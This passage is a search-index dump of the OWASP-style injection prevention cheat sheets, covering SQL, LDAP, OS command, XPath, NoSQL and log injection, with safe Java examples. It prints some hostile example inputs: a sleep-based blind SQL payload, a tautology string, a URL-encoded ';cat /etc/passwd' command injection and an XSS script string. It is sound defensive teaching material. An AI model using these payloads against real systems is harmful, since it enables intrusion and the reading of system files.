syntax for that interpreter. Other Injection Cheatsheets \u00b6 SQL Injection Prevention Cheat Sheet OS Command Injection Defense Cheat Sheet LDAP Injection Prevention Cheat Sheet Injection Prevention Cheat Sheet in Java","title":"Injection Prevention"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-cheat-sheet","text":"","title":"Injection Prevention Cheat Sheet"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#introduction","text":"This article is focused on providing clear, simple, actionable guidance for preventing the entire category of Injection flaws in your applications. Injection attacks, especially SQL Injection , are unfortunately very common. Application accessibility is a very important factor in protection and prevention of injection flaws. Only the minority of all applications within a company/enterprise are developed in house, where as most applications are from external sources. Open source applications give at least the opportunity to fix problems, but closed source applications need a different approach to injection flaws. Injection flaws occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code, often found in SQL queries, LDAP queries, XPath queries, OS commands, program arguments, etc. Injection flaws are easy to discover when examining code, but more difficult via testing. Scanners and fuzzers can help attackers find them. Depending on the accessibility different actions must be taken in order to fix them. It is always the best way to fix the problem in source code itself, or even redesign some parts of the applications. But if the source code is not available or it is simply uneconomical to fix legacy software only virtual patching makes sense.","title":"Introduction"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#application-types","text":"Three classes of applications can usually be seen within a company. Those 3 types are needed to identify the actions which need to take place in order to prevent/fix injection flaws.","title":"Application Types"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#a1-new-application","text":"A new web application in the design phase, or in early stage development.","title":"A1: New Application"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#a2-productive-open-source-application","text":"An already productive application, which can be easily adapted. A Model-View-Controller (MVC) type application is just one example of having a easily accessible application architecture.","title":"A2: Productive Open Source Application"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#a3-productive-closed-source-application","text":"A productive application which cannot or only with difficulty be modified.","title":"A3: Productive Closed Source Application"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#forms-of-injection","text":"There are several forms of injection targeting different technologies including SQL queries, LDAP queries, XPath queries and OS commands.","title":"Forms of Injection"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#query-languages","text":"The most famous form of injection is SQL Injection where an attacker can modify existing database queries. For more information see the SQL Injection Prevention Cheat Sheet . But also LDAP, SOAP, XPath and REST based queries can be susceptible to injection attacks allowing for data retrieval or control bypass.","title":"Query languages"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#sql-injection","text":"An SQL injection attack consists of insertion or \"injection\" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands. SQL Injection attacks can be divided into the following three classes: Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page. Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester). Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.","title":"SQL Injection"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#how-to-test-for-the-issue","text":"","title":"How to test for the issue"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#during-code-review","text":"please check for any queries to the database are not done via prepared statements. If dynamic statements are being made please check if the data is sanitized before used as par of the statement. Auditors should always look for uses of sp_execute, execute or exec within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors.","title":"During code review"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#automated-exploitation","text":"Most of the situation and techniques below here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using SQLMap Equally Static Code Analysis Data flow rules can detect of unsanitized user controlled input can change the SQL query.","title":"Automated Exploitation"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#stored-procedure-injection","text":"When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.","title":"Stored Procedure Injection"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#time-delay-exploitation-technique","text":"The time delay exploitation technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section). http://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))-- In this example the tester if checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn't need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.","title":"Time delay Exploitation technique"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#out-of-band-exploitation-technique","text":"This technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester's server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.","title":"Out of band Exploitation technique"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#remediation","text":"","title":"Remediation"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#defense-option-1-prepared-statements-with-parameterized-queries","text":"Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker. In the safe example below, if an attacker were to enter the userID of tom' or '1'='1 , the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string tom' or '1'='1 .","title":"Defense Option 1: Prepared Statements (with Parameterized Queries)"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#defense-option-2-stored-procedures","text":"The difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, and then called from the application. Both of these techniques have the same effectiveness in preventing SQL injection so your organization should choose which approach makes the most sense for you. Stored procedures are not always safe from SQL injection. However, certain standard stored procedure programming constructs have the same effect as the use of parameterized queries when implemented safely* which is the norm for most stored procedure languages. Note: 'Implemented safely' means the stored procedure does not include any unsafe dynamic SQL generation.","title":"Defense Option 2: Stored Procedures"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#defense-option-3-white-list-input-validation","text":"Various parts of SQL queries aren't legal locations for the use of bind variables, such as the names of tables or columns, and the sort order indicator (ASC or DESC). In such situations, input validation or query redesign is the most appropriate defense. For the names of tables or columns, ideally those values come from the code, and not from user parameters. But if user parameter values are used to make different for table names and column names, then the parameter values should be mapped to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query. Please note, this is a symptom of poor design and a full rewrite should be considered if time allows.","title":"Defense Option 3: White List Input Validation"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#defense-option-4-escaping-all-user-supplied-input","text":"This technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations. This technique is to escape user input before putting it in a query. It's usually only recommended to retrofit legacy code when implementing input validation isn't cost effective.","title":"Defense Option 4: Escaping All User-Supplied Input"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#example-code-java","text":"","title":"Example code - Java"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#safe-java-prepared-statement-example","text":"The following code example uses a PreparedStatement , Java's implementation of a parameterized query, to execute the same database query. // This should REALLY be validated too String custname = request . getParameter ( \"customerName\" ); // Perform input validation to detect attacks String query = \"SELECT account_balance FROM user_data WHERE user_name = ?\" ; PreparedStatement pstmt = connection . prepareStatement ( query ); pstmt . setString ( 1 , custname ); ResultSet results = pstmt . executeQuery (); We have shown examples in Java, but practically all other languages, including Cold Fusion, and Classic ASP, support parameterized query interfaces.","title":"Safe Java Prepared Statement Example"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#safe-java-stored-procedure-example","text":"The following code example uses a CallableStatement , Java's implementation of the stored procedure interface, to execute the same database query. The sp_getAccountBalance stored procedure would have to be predefined in the database and implement the same functionality as the query defined above. // This should REALLY be validated String custname = request . getParameter ( \"customerName\" ); try { CallableStatement cs = connection . prepareCall ( \"{call sp_getAccountBalance(?)}\" ); cs . setString ( 1 , custname ); ResultSet results = cs . executeQuery (); // Result set handling... } catch ( SQLException se ) { // Logging and error handling... }","title":"Safe Java Stored Procedure Example"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#ldap-injection","text":"LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to SQL Injection . LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree. For more information on LDAP Injection attacks, visit LDAP injection . LDAP injection attacks are common due to two factors: The lack of safer, parameterized LDAP query interfaces The widespread use of LDAP to authenticate users to systems.","title":"LDAP Injection"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#how-to-test-for-the-issue_1","text":"","title":"How to test for the issue"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#during-code-review_1","text":"Please check for any queries to the LDAP escape special characters, see here .","title":"During code review"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#automated-exploitation_1","text":"Scanner module of tool like OWASP ZAP have module to detect LDAP injection issue.","title":"Automated Exploitation"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#remediation_1","text":"","title":"Remediation"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#escape-all-variables-using-the-right-ldap-encoding-function","text":"The main way LDAP stores names is based on DN ( distinguished name ). You can think of this like a unique identifier. These are sometimes used to access resources, like a username. A DN might look like this cn=Richard Feynman, ou=Physics Department, dc=Caltech, dc=edu or uid=inewton, ou=Mathematics Department, dc=Cambridge, dc=com There are certain characters that are considered special characters in a DN. The exhaustive list is the following: \\ # + < > , ; \" = and leading or trailing spaces Each DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users will certain attributes, you may do so with search filters. In a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation. Example: (&(ou=Physics)(| (manager=cn=Freeman Dyson,ou=Physics,dc=Caltech,dc=edu) (manager=cn=Albert Einstein,ou=Physics,dc=Princeton,dc=edu) )) When building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource.","title":"Escape all variables using the right LDAP encoding function"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#example-code-java_1","text":"","title":"Example code - Java"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#safe-java-for-ldap-escaping-example","text":"public String escapeDN ( String name ) { //From RFC 2253 and the / character for JNDI final char [] META_CHARS = { '+' , '\"' , '<' , '>' , ';' , '/' }; String escapedStr = new String ( name ); //Backslash is both a Java and an LDAP escape character, //so escape it first escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\\\\\\\\\" , \"\\\\\\\\\\\\\\\\\" ); //Positional characters - see RFC 2253 escapedStr = escapedStr . replaceAll ( \"\\^#\" , \"\\\\\\\\\\\\\\\\#\" ); escapedStr = escapedStr . replaceAll ( \"\\^ | $\" , \"\\\\\\\\\\\\\\\\ \" ); for ( int i = 0 ; i < META_CHARS . length ; i ++ ) { escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\" + META_CHARS [ i ] , \"\\\\\\\\\\\\\\\\\" + META_CHARS [ i ] ); } return escapedStr ; } Note, that the backslash character is a Java String literal and a regular expression escape character. public String escapeSearchFilter ( String filter ) { //From RFC 2254 String escapedStr = new String ( filter ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\\\\\\\\\" , \"\\\\\\\\\\\\\\\\5c\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\\*\" , \"\\\\\\\\\\\\\\\\2a\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\(\" , \"\\\\\\\\\\\\\\\\28\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\)\" , \"\\\\\\\\\\\\\\\\29\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\" + Character . toString ( '\\\\ u0000 ' ), \"\\\\\\\\\\\\\\\\00\" ); return escapedStr ; }","title":"Safe Java for LDAP escaping Example"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection","text":"TODO","title":"XPath Injection"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#scripting-languages","text":"All scripting languages used in web applications have a form of an eval call which receives code at runtime and executes it. If code is crafted using unvalidated and unescaped user input code injection can occur which allows an attacker to subvert application logic and eventually to gain local access. Every time a scripting language is used, the actual implementation of the 'higher' scripting language is done using a 'lower' language like C. If the scripting language has a flaw in the data handling code ' Null Byte Injection ' attack vectors can be deployed to gain access to other areas in memory, which results in a successful attack.","title":"Scripting languages"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#operating-system-commands","text":"OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.","title":"Operating System Commands"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#how-to-test-for-the-issue_2","text":"","title":"How to test for the issue"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#during-code-review_2","text":"Check if any command execute methods are called and in unvalidated user input are taken as data for that command. Out side of that, appending a semicolon to the end of a URL query parameter followed by an operating system command, will execute the command. %3B is URL encoded and decodes to semicolon. This is because the ; is interpreted as a command separator. Example: http://sensitive/something.php?dir=%3Bcat%20/etc/passwd If the application responds with the output of the /etc/passwd file then you know the attack has been successful. Many web application scanners can be used to test for this attack as they inject variations of command injections and test the response. Equally Static Code Analysis tools check the data flow of untrusted user input into a web application and check if the data is then entered into a dangerous method which executes the user input as a command.","title":"During code review"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#remediation_2","text":"If it is considered unavoidable the call to a system command incorporated with user-supplied, the following two layers of defense should be used within software in order to prevent attacks Parameterization - If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help to provide the relevant quoting, encoding. Input validation - the values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments: When it comes to the commands used, these must be validated against a whitelist of allowed commands. In regards to the arguments used for these commands, they should be validated using the following options: Positive or \"whitelist\" input validation - where are the arguments allowed explicitly defined White list Regular Expression - where is explicitly defined a whitelist of good characters allowed and the maximum length of the string. Ensure that metacharacters like & | ; $ > < \\ \\ !` and white-spaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers, and does not contain metacharacters. The length is also being limited to 3-10 characters: ^[a-z0-9]{3,10}$","title":"Remediation"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#example-code-java_2","text":"","title":"Example code - Java"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#incorrect-usage","text":"ProcessBuilder b = new ProcessBuilder ( \"C:\\DoStuff.exe -arg1 -arg2\" ); In this example, the command together with the arguments are passed as a one string, making easy to manipulate that expression and inject malicious strings.","title":"Incorrect Usage"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#correct-usage","text":"Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This make it easy to validated each term and reduces the risk to insert malicious strings. ProcessBuilder pb = new ProcessBuilder ( \"TrustedCmd\" , \"TrustedArg1\" , \"TrustedArg2\" ); Map < String , String > env = pb . environment (); pb . directory ( new File ( \"TrustedDir\" )); Process p = pb . start ();","title":"Correct Usage"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#network-protocols","text":"Web applications often communicate with network daemons (like SMTP, IMAP, FTP) where user input becomes part of the communication stream. Here it is possible to inject command sequences to abuse an established session.","title":"Network Protocols"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-rules","text":"","title":"Injection Prevention Rules"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#rule-1-perform-proper-input-validation","text":"Perform proper input validation. Positive or \"whitelist\" input validation with appropriate canonicalization is also recommended, but is not a complete defense as many applications require special characters in their input.","title":"Rule #1 (Perform proper input validation)"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#rule-2-use-a-safe-api","text":"The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful of APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.","title":"Rule #2 (Use a safe API)"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#rule-3-contextually-escape-user-data","text":"If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.","title":"Rule #3 (Contextually escape user data)"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html#other-injection-cheatsheets","text":"SQL Injection Prevention Cheat Sheet OS Command Injection Defense Cheat Sheet LDAP Injection Prevention Cheat Sheet Injection Prevention Cheat Sheet in Java","title":"Other Injection Cheatsheets"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html","text":"Injection Prevention Cheat Sheet in Java \u00b6 Introduction \u00b6 This document has for objective to provide some tips to handle Injection into Java application code. Sample codes used in tips are located here . What is Injection \u00b6 Injection in OWASP Top 10 is defined as following: Consider anyone who can send untrusted data to the system, including external users, internal users, and administrators. General advices to prevent Injection \u00b6 The following point can be applied, in a general way, to prevent Injection issue: Apply Input Validation (using whitelist approach) combined with Output Sanitizing+Escaping on user input/output. If you need to interact with system, try to use API features provided by your technology stack (Java / .Net / PHP...) instead of building command. Additional advices are provided on this cheatsheet . Specific Injection types \u00b6 Examples in this section will be provided in Java technology (see Maven project associated) but advices are applicable to others technologies like .Net / PHP / Ruby / Python... SQL \u00b6 Symptom \u00b6 Injection of this type occur when the application use untrusted user input to build a SQL query using a String and execute it. How to prevent \u00b6 Use Query Parameterization in order to prevent injection. Example \u00b6 /*No DB framework used here in order to show the real use of Prepared Statement from Java API*/ /*Open connection with H2 database and use it*/ Class . forName ( \"org.h2.Driver\" ); String jdbcUrl = \"jdbc:h2:file:\" + new File ( \".\" ). getAbsolutePath () + \"/target/db\" ; try ( Connection con = DriverManager . getConnection ( jdbcUrl )) { /* Sample A: Select data using Prepared Statement*/ String query = \"select * from color where friendly_name = ?\" ; List < String > colors = new ArrayList <> (); try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , \"yellow\" ); try ( ResultSet rSet = pStatement . executeQuery ()) { while ( rSet . next ()) { colors . add ( rSet . getString ( 1 )); } } } Assert . assertEquals ( 1 , colors . size ()); Assert . assertTrue ( colors . contains ( \"yellow\" )); /* Sample B: Insert data using Prepared Statement*/ query = \"insert into color(friendly_name, red, green, blue) values(?, ?, ?, ?)\" ; int insertedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , \"orange\" ); pStatement . setInt ( 2 , 239 ); pStatement . setInt ( 3 , 125 ); pStatement . setInt ( 4 , 11 ); insertedRecordCount = pStatement . executeUpdate (); } Assert . assertEquals ( 1 , insertedRecordCount ); /* Sample C: Update data using Prepared Statement*/ query = \"update color set blue = ? where friendly_name = ?\" ; int updatedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setInt ( 1 , 10 ); pStatement . setString ( 2 , \"orange\" ); updatedRecordCount = pStatement . executeUpdate (); } Assert . assertEquals ( 1 , updatedRecordCount ); /* Sample D: Delete data using Prepared Statement*/ query = \"delete from color where friendly_name = ?\" ; int deletedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , \"orange\" ); deletedRecordCount = pStatement . executeUpdate (); } Assert . assertEquals ( 1 , deletedRecordCount ); } References \u00b6 SQL Injection Prevention Cheat Sheet JPA \u00b6 Symptom \u00b6 Injection of this type occur when the application use untrusted user input to build a JPA query using a String and execute it. It's quite similar to SQL injection but here the altered language is not SQL but JPA QL. How to prevent \u00b6 Use Java Persistence Query Language Query Parameterization in order to prevent injection. Example \u00b6 EntityManager entityManager = null ; try { /* Get a ref on EntityManager to access DB */ entityManager = Persistence . createEntityManagerFactory ( \"testJPA\" ). createEntityManager (); /* Define parameterized query prototype using named parameter to enhance readability */ String queryPrototype = \"select c from Color c where c.friendlyName = :colorName\" ; /* Create the query, set the named parameter and execute the query */ Query queryObject = entityManager . createQuery ( queryPrototype ); Color c = ( Color ) queryObject . setParameter ( \"colorName\" , \"yellow\" ). getSingleResult (); /* Ensure that the object obtained is the right one */ Assert . assertNotNull ( c ); Assert . assertEquals ( c . getFriendlyName (), \"yellow\" ); Assert . assertEquals ( c . getRed (), 213 ); Assert . assertEquals ( c . getGreen (), 242 ); Assert . assertEquals ( c . getBlue (), 26 ); } finally { if ( entityManager != null && entityManager . isOpen ()) { entityManager . close (); } } References \u00b6 SQLi and JPA Operating System \u00b6 Symptom \u00b6 Injection of this type occur when the application use untrusted user input to build a Operating System command using a String and execute it. How to prevent \u00b6 Use technology stack API in order to prevent injection. Example \u00b6 /* The context taken is, for example, to perform a PING against a computer. * The prevention is to use the feature provided by the Java API instead of building * a system command as String and execute it */ InetAddress host = InetAddress . getByName ( \"localhost\" ); Assert . assertTrue ( host . isReachable ( 5000 )); References \u00b6 Command Injection XML: XPath Injection \u00b6 Symptom \u00b6 Injection of this type occur when the application use untrusted user input to build a XPath query using a String and execute it. How to prevent \u00b6 Use XPath Variable Resolver in order to prevent injection. Example \u00b6 Variable Resolver implementation. /** * Resolver in order to define parameter for XPATH expression. * */ public class SimpleVariableResolver implements XPathVariableResolver { private final Map < QName , Object > vars = new HashMap < QName , Object > (); /** * External methods to add parameter * * @param name Parameter name * @param value Parameter value */ public void addVariable ( QName name , Object value ) { vars . put ( name , value ); } /** * {@inheritDoc} * * @see javax.xml.xpath.XPathVariableResolver#resolveVariable(javax.xml.namespace.QName) */ public Object resolveVariable ( QName variableName ) { return vars . get ( variableName ); } } Code using it to perform XPath query. /*Create a XML document builder factory*/ DocumentBuilderFactory dbf = DocumentBuilderFactory . newInstance (); /*Disable External Entity resolution for differents cases*/ //Do not performed here in order to focus on variable resolver code //but do it for production code ! /*Load XML file*/ DocumentBuilder builder = dbf . newDocumentBuilder (); Document doc = builder . parse ( new File ( \"src/test/resources/SampleXPath.xml\" )); /* Create and configure parameter resolver */ String bid = \"bk102\" ; SimpleVariableResolver variableResolver = new SimpleVariableResolver (); variableResolver . addVariable ( new QName ( \"bookId\" ), bid ); /*Create and configure XPATH expression*/ XPath xpath = XPathFactory . newInstance (). newXPath (); xpath . setXPathVariableResolver ( variableResolver ); XPathExpression xPathExpression = xpath . compile ( \"//book[@id=$bookId]\" ); /* Apply expression on XML document */ Object nodes = xPathExpression . evaluate ( doc , XPathConstants . NODESET ); NodeList nodesList = ( NodeList ) nodes ; Assert . assertNotNull ( nodesList ); Assert . assertEquals ( 1 , nodesList . getLength ()); Element book = ( Element ) nodesList . item ( 0 ); Assert . assertTrue ( book . getTextContent (). contains ( \"Ralls, Kim\" )); References \u00b6 XPATH Injection HTML/JavaScript/CSS \u00b6 Symptom \u00b6 Injection of this type occur when the application use untrusted user input to build a HTTP response and sent it to browser. How to prevent \u00b6 Either apply strict input validation (whitelist approach) or use output sanitizing+escaping if input validation is not possible (combine both every time is possible). Example \u00b6 /* INPUT WAY: Receive data from user Here it's recommended to use strict input validation using whitelist approach. In fact, you ensure that only allowed characters are part of the input received. */ String userInput = \"You user login is owasp-user01\" ; /* First we check that the value contains only expected character*/ Assert . assertTrue ( Pattern . matches ( \"[a-zA-Z0-9\\\\s\\\\-]{1,50}\" , userInput )); /* If the first check pass then ensure that potential dangerous character that we have allowed for business requirement are not used in a dangerous way. For example here we have allowed the character '-', and, this can be used in SQL injection so, we ensure that this character is not used is a continuous form. Use the API COMMONS LANG v3 to help in String analysis... */ Assert . assertEquals ( 0 , StringUtils . countMatches ( userInput . replace ( \" \" , \"\" ), \"--\" )); /* OUTPUT WAY: Send data to user Here we escape + sanitize any data sent to user Use the OWASP Java HTML Sanitizer API to handle sanitizing Use the OWASP Java Encoder API to handle HTML tag encoding (escaping) */ String outputToUser = \"You <p>user login</p> is <strong>owasp-user01</strong>\" ; outputToUser += \"<script>alert(22);</script><img src='#' onload='javascript:alert(23);'>\" ; /* Create a sanitizing policy that only allow tag '<p>' and '<strong>'*/ PolicyFactory policy = new HtmlPolicyBuilder (). allowElements ( \"p\" , \"strong\" ). toFactory (); /* Sanitize the output that will be sent to user*/ String safeOutput = policy . sanitize ( outputToUser ); /* Encode HTML Tag*/ safeOutput = Encode . forHtml ( safeOutput ); String finalSafeOutputExpected = \"You <p>user login</p> is <strong>owasp-user01</strong>\" ; Assert . assertEquals ( finalSafeOutputExpected , safeOutput ); References \u00b6 XSS OWASP Java HTML Sanitizer OWASP Java Encoder Java RegEx LDAP \u00b6 A dedicated cheatsheet has been created. NoSQL \u00b6 Symptom \u00b6 Injection of this type occur when the application use untrusted user input to build a NoSQL API call expression. How to prevent \u00b6 As there many NoSQL database system and each one use a API for call, it's important to ensure that user input received and used to build the API call expression do not contains any character that have a special meaning in the target API syntax. This in order to avoid that it will be used to escape the initial call expression in order to create another one based on crafted user input. It's also important to not use string concatenation to build API call expression but use the API to create the expression. Example - MongoDB \u00b6 /* Here use MongoDB as target NoSQL DB */ String userInput = \"Brooklyn\" ; /* First ensure that the input do no contains any special characters for the current NoSQL DB call API, here they are: ' \" \\ ; { } $ */ //Avoid regexp this time in order to made validation code //more easy to read and understand... ArrayList < String > specialCharsList = new ArrayList < String > () { { add ( \"'\" ); add ( \"\\\"\" ); add ( \"\\\\\" ); add ( \";\" ); add ( \"{\" ); add ( \"}\" ); add ( \"$\" ); } }; specialCharsList . forEach ( specChar -> Assert . assertFalse ( userInput . contains ( specChar ))); //Add also a check on input max size Assert . assertTrue ( userInput . length () <= 50 ); /* Then perform query on database using API to build expression */ //Connect to the local MongoDB instance try ( MongoClient mongoClient = new MongoClient ()){ MongoDatabase db = mongoClient . getDatabase ( \"test\" ); //Use API query builder to create call expression //Create expression Bson expression = eq ( \"borough\" , userInput ); //Perform call FindIterable < org . bson . Document > restaurants = db . getCollection ( \"restaurants\" ). find ( expression ); //Verify result consistency restaurants . forEach ( new Block < org . bson . Document > () { @Override public void apply ( final org . bson . Document doc ) { String restBorough = ( String ) doc . get ( \"borough\" ); Assert . assertTrue ( \"Brooklyn\" . equals ( restBorough )); } }); } References \u00b6 Testing for NoSQL injection SQL and NoSQL Injection No SQL, No Injection? Log Injection \u00b6 Symptom \u00b6 Log Injection occurs when an application includes untrusted data in an application log message (e.g., an attacker can cause an additional log entry that looks like it came from a completely different user, if they can inject CRLF characters in the untrusted data). More information about this attack is available on the OWASP Log Injection page. How to prevent \u00b6 To prevent an attacker from writing malicious content into the application log, apply defenses such as: Filter the user input used to prevent injection of C arriage R eturn (CR) or L ine F eed (LF) characters. Limit the size of the user input value used to create the log message. Make sure all XSS defenses are applied when viewing log files in a web browser. Example using Log4j2 \u00b6 Configuration of a logging policy to roll on 10 files of 5MB each, and encode/limit the log message using the Pattern encode{}{CRLF} , introduced in Log4j2 v2.10.0 , and the -500m message size limit.: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <Configuration status= \"error\" name= \"SecureLoggingPolicy\" > <Appenders> <RollingFile name= \"RollingFile\" fileName= \"App.log\" filePattern= \"App-%i.log\" ignoreExceptions= \"false\" > <PatternLayout> <!-- Encode any CRLF chars in the message and limit its maximum size to 500 characters --> <Pattern> %d{ISO8601} %-5p - %encode{ %.-500m }{CRLF}%n </Pattern> </PatternLayout> <Policies> <SizeBasedTriggeringPolicy size= \"5MB\" /> </Policies> <DefaultRolloverStrategy max= \"10\" /> </RollingFile> </Appenders> <Loggers> <Root level= \"debug\" > <AppenderRef ref= \"RollingFile\" /> </Root> </Loggers> </Configuration> Usage of the logger at code level: import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; ... // No special action needed because security actions are // performed at the logging policy level Logger logger = LogManager . getLogger ( MyClass . class ); logger . info ( logMessage ); ... Example using Logback with the OWASP Security Logging library \u00b6 Configuration of a logging policy to roll on 10 files of 5MB each, and encode/limit the log message using the CRLFConverter , provided by the OWASP Security Logging Project , and the -500msg message size limit: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <configuration> <!-- Define the CRLFConverter --> <conversionRule conversionWord= \"crlf\" converterClass= \"org.owasp.security.logging.mask.CRLFConverter\" /> <appender name= \"RollingFile\" class= \"ch.qos.logback.core.rolling.RollingFileAppender\" > <file> App.log </file> <rollingPolicy class= \"ch.qos.logback.core.rolling.FixedWindowRollingPolicy\" > <fileNamePattern> App-%i.log </fileNamePattern> <minIndex> 1 </minIndex> <maxIndex> 10 </maxIndex> </rollingPolicy> <triggeringPolicy class= \"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\" > <maxFileSize> 5MB </maxFileSize> </triggeringPolicy> <encoder> <!-- Encode any CRLF chars in the message and limit its maximum size to 500 characters --> <pattern> %relative [%thread] %-5level %logger{35} - %crlf(%.-500msg) %n </pattern> </encoder> </appender> <root level= \"debug\" > 